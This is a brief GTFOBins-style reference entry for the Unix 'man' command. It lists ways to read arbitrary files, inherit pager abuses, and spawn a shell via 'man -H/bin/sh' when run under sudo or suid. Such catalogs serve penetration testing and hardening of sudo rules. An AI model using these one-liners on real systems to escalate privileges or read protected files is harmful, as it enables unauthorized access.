---
type: gtfobin
name: man
platform: Unix
functions: [file-read, inherit, shell]
tags: [gtfobin, unix, lotl]
---

# man

## file-read

```bash
man /path/to/input-file
```
_The file is shown somehow formatted and displayed in the default pager._
**Contexts:** sudo, suid, unprivileged

## inherit

```bash
man man
```
**Contexts:** sudo, suid, unprivileged

## shell

```bash
man '-H/bin/sh #' man
```
_This requires GNU `troff` (`groff`) to be installed._
**Contexts:** sudo, suid, unprivileged
